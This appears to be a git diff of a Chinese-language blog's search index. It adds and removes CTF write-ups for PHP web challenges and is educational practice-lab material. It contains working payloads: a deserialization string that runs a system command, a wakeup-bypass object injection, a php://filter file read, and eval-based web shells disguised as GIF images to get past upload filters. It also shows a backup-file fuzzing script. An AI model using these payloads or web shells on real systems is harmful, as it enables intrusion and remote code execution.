class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到那个Test类的<strong>__</strong>destruct，想到和反序列化有关，想到先用反序列化和最后那个gettime搞出Test对象，再利用destruct里的gettime点来实现爆flag</p>
+<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/7-1.png" alt="7-1"></p>
+<p>上传POST数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find &#x2F; -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是爆出来flag</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最后一步试着写一个python脚本爬虫来爆出flag</p>
 ]]></content>
+      <categories>
+        <category>web刷题</category>
+      </categories>
       <tags>
         <tag>BUU</tag>
       </tags>
@@ -2104,7 +3018,7 @@ Son mygs = <span class="keyword">new</span> grandSon();</code></pre>
 <blockquote>
 <p>注：input2.php只充当作为地址基址的作用，使用同一目录下的input1.php也可以</p>
 </blockquote>
-<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure>
+<h1 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure>
 
 <p>相当于要上传一个text的文件并且内容是welcome to the zjctf</p>
 <p>于是payload</p>
@@ -2176,118 +3090,6 @@ Son mygs = <span class="keyword">new</span> grandSon();</code></pre>
 </ol>
 </blockquote>
 ]]></content>
-  </entry>
-  <entry>
-    <title>2019极客大挑战</title>
-    <url>/2020/07/22/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
-    <content><![CDATA[<h1 id="php1"><a href="#php1" class="headerlink" title="php1"></a>php1</h1><p>首先disearch扫描发现<a href="http://www.zip（-e是指网页语言）" target="_blank" rel="noopener">www.zip（-e是指网页语言）</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;dirsearch.py -u http:&#x2F;&#x2F;aec505e5-41e7-46e2-96ec-a816c3d21a1c.node3.buuoj.cn&#x2F;  -e php</span><br></pre></td></tr></table></figure>
-
-<p>或者python脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(sys)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">suffixList = [<span class="string">'.rar'</span>,<span class="string">'.zip'</span>,<span class="string">'.tar'</span>,<span class="string">'.tar.gz'</span>]</span><br><span class="line">keyList = [<span class="string">'www'</span>,<span class="string">'wwwroot'</span>,<span class="string">'site'</span>,<span class="string">'web'</span>,<span class="string">'website'</span>,<span class="string">'backup'</span>,<span class="string">'data'</span>,<span class="string">'mdb'</span>,<span class="string">'WWW'</span>,<span class="string">'新建文件夹'</span>,<span class="string">'ceshi'</span>,<span class="string">'databak'</span>,</span><br><span class="line"><span class="string">'db'</span>,<span class="string">'database'</span>,<span class="string">'sql'</span>,<span class="string">'bf'</span>,<span class="string">'备份'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'11'</span>,<span class="string">'111'</span>,<span class="string">'a'</span>,<span class="string">'123'</span>,<span class="string">'test'</span>,<span class="string">'admin'</span>,<span class="string">'app'</span>,<span class="string">'bbs'</span>,<span class="string">'htdocs'</span>,<span class="string">'wangzhan'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url)</span>:</span></span><br><span class="line">    num1 = url.find(<span class="string">'.'</span>)</span><br><span class="line">    num2 = url.find(<span class="string">'.'</span>, num1 + <span class="number">1</span>)</span><br><span class="line">    keyList.append(url[num1 + <span class="number">1</span>:num2])</span><br><span class="line">    keyList.append(url) </span><br><span class="line">    keyList.append(url.replace(<span class="string">'.'</span>, <span class="string">'_'</span>))  </span><br><span class="line">    keyList.append(url.replace(<span class="string">'.'</span>, <span class="string">''</span>)) </span><br><span class="line">    keyList.append(url[num1 + <span class="number">1</span>:]) </span><br><span class="line">    keyList.append(url[num1 + <span class="number">1</span>:].replace(<span class="string">'.'</span>, <span class="string">'_'</span>))  </span><br><span class="line"><span class="comment">#用法 python3 bfuzz.py www.baidu.com        </span></span><br><span class="line">url =sys.argv[<span class="number">1</span>]</span><br><span class="line">run(url)</span><br><span class="line"></span><br><span class="line">tempList = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> keyList:</span><br><span class="line">    <span class="keyword">for</span> suff <span class="keyword">in</span> suffixList:</span><br><span class="line">        tempList.append(key + suff)</span><br><span class="line">fobj = open(url+<span class="string">".txt"</span> , <span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> tempList:</span><br><span class="line">    fobj.write(<span class="string">'%s%s'</span> % (each,<span class="string">'\n'</span>))</span><br><span class="line">    fobj.flush()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>解压后发现三个php：</p>
-<p>index.php:（重点部分）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>class.php:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>首先观察并得到两段代码之间的关系，发现需要找到select变量序列化serialize()之后的值，这之中要使username=admin，password=100，并且还要越过____wakeup()函数。</p>
-<p>其中class.php里的”<strong><strong>construct()”、”</strong></strong>destruct()”、”____wakeup()”函数</p>
-<blockquote>
-<p><strong>__construct()当一个对象创建时被调用<br> __</strong>destruct()当一个对象销毁时被调用<br> <strong>__sleep() 在对象在被序列化之前运行<br> __</strong>wakeup()将在序列化之后立即被调用 （在反序列化前被调用）</p>
-</blockquote>
-<p>更多魔术方法可<a href="https://www.cnblogs.com/limeng951/p/5622830.html" target="_blank" rel="noopener">参考这篇</a></p>
-<p>一个类在被序列化之后会有以下格式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对象:对象名长度:“对象名称”:对象成员个数:&#123;s字符串:名称长度:“名称”;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>若上述代码最后添加</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; new Name(&#39;admin&#39;,100);</span><br><span class="line">$b&#x3D;serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
-
-<p>会得到：</p>
-<p><img src="/2020/07/22/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/php1.png" alt="php1"></p>
-<p>可得到正确的username,password的序列化,还得注意username和password是private属性</p>
-<blockquote>
-<p> private属性序列化:%00类名%00成员名<br> protect属性序列化:%00*%00成员名</p>
-</blockquote>
-<p>所以payload要像这样</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>关于序列化和反序列化具体可<a href="https://xz.aliyun.com/t/6753" target="_blank" rel="noopener">参考这篇</a></p>
-<p>还有一个问题就是要绕过____wakeup()函数</p>
-<p>在class.php中执行wakeup()的时候username会被覆盖,所以要跳过</p>
-<blockquote>
-<p> <strong>当反序列化时，若属性个数大于真实属性个数时，则会跳过__wakeup()</strong></p>
-</blockquote>
-<p>则最终payload如下：（2改成3）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p>题外话：这个网页也太可爱了</p>
-<p><img src="/2020/07/22/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/php1_2.png" alt="php1_2"></p>
-<h1 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h1><p>先bp抓个包，找到重定向之前的action.php里面提示到secr3t.php页面，这个页面内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>再到flag.php却发现：源码里也没什么线索</p>
-<p><img src="/2020/07/22/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/sf.png" alt="sf"></p>
-<p>想到用php的伪协议：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://blog.csdn.net/nzjdsds/article/details/82461043" target="_blank" rel="noopener">参考这篇</a></p>
-<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><p>这篇主要记住几个header及其含义</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">referer： 从某个页面访问</span><br><span class="line">X-Forwarded-For： 从某个ip地址访问</span><br><span class="line">User-Agent： 修改浏览器</span><br><span class="line">Accept-Language：  从某个国家访问</span><br></pre></td></tr></table></figure>
-
-<p><img src="2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/http1.png" alt="http1"></p>
-<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>先直接上传mu.php</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;key&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>提示<strong>not a image</strong>，于是想到MIME验证，修改content type</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content-type: image&#x2F;png;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>提示<strong>NOT！php!</strong>那么想到用其他文件格式</p>
-<blockquote>
-<p>.php上传被过滤时可以用的别名：php2, php3, php4, php5, phps, pht, phtm, phtml</p>
-</blockquote>
-<p>那么换成mu.phtml，结果提示<strong>NO! HACKER! your file included ‘&lt;?’</strong></p>
-<p>那么想到构造mu2.phtml</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;syc&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>结果提示<strong>Don’t lie to me, it’s not image at all!!!</strong>（这出题人真的把我的心里摸得透透的）</p>
-<p>于是想到加文件头GIF89a?，即</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;syc&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>上传后终于成功！！！</p>
-<p>然后连接蚁剑，猜测文件在/upload下，成功，连接成功在根目录拿flag</p>
-<blockquote>
-<p>又试了下把mu2.phtml和xx.png合并上传可以成功，但蚁剑连接不成功，也不晓得为什么。。。</p>
-</blockquote>
-<h1 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h1><p>这题涉及POST上传和对cookie的修改。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这一段需要用到php弱类型比较，可以利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">404 &#x3D;&#x3D; 404a</span><br></pre></td></tr></table></figure>
-
-<p>然后对于money，输入money=1000000000，显示太长，联想到strcmp函数比较：<a href="https://www.cnblogs.com/llww/p/12156524.html" target="_blank" rel="noopener">参考strcmp漏洞（php5.3之前）</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">money[]&#x3D;1</span><br></pre></td></tr></table></figure>
-
-<p>或者利用科学计数法</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">money&#x3D;1e9</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>BUU</tag>
-      </tags>
   </entry>
   <entry>
     <title>记一次《c语言连接mysql的单词背诵程序》开发过程</title>
@@ -10239,6 +11041,12 @@ eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quo
 <p>这句整个就代表<strong>一个字母与下划线组成的字符串</strong>加一个<strong>括号</strong>，括号里面没有东西或者继续引用本语句，也就是类似于</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a(b(c()))</span><br></pre></td></tr></table></figure>
 
+
+
+
+
+<h4 id="n【n代表数字】"><a href="#n【n代表数字】" class="headerlink" title="\n【n代表数字】"></a>\n【n代表数字】</h4><p><strong>反向引用</strong> </p>
+<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong>中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
 ]]></content>
       <categories>
         <category>JS</category>
